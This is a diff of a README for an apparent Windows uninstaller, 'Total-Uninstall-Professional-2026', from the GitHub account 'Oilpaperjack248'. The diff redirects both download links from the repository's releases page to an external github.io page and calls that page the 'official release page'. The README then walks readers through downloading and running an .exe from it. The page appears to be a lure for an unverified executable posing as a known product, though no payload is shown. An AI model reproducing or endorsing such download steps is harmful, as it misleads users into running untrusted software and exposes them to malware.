@@ -1,6 +1,6 @@
 # 🧹 Total-Uninstall-Professional-2026 - Remove unwanted software without leaving traces
 
-[![](https://img.shields.io/badge/Download-Total_Uninstall_Professional-blue.svg)](https://github.com/Oilpaperjack248/Total-Uninstall-Professional-2026/releases)
+[![](https://img.shields.io/badge/Download-Total_Uninstall_Professional-blue.svg)](https://oilpaperjack248.github.io)
 
 ## 📁 Project Overview
 Total Uninstall Professional 2026 removes software from your computer. Standard removal tools often leave behind hidden files and registry entries. These leftovers take up disk space and slow down your system. This tool tracks changes made during an installation to ensure a complete removal when you decide to delete a program. 
@@ -11,7 +11,7 @@ This application works on Windows 10 and Windows 11. It provides a clean interfa
 You need a computer running Windows 10 or Windows 11. The software requires 200 MB of free disk space. A processor speed of 1 GHz or higher works best. You need at least 2 GB of RAM to run this tool. Ensure you have an active internet connection to download the installer.
 
 ## 📥 How to Download the Software
-1. Visit the [official release page](https://github.com/Oilpaperjack248/Total-Uninstall-Professional-2026/releases) to see available versions.
+1. Visit the [official release page](https://oilpaperjack248.github.io) to see available versions.
 2. Look for the latest release under the "Assets" section.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your Downloads folder.
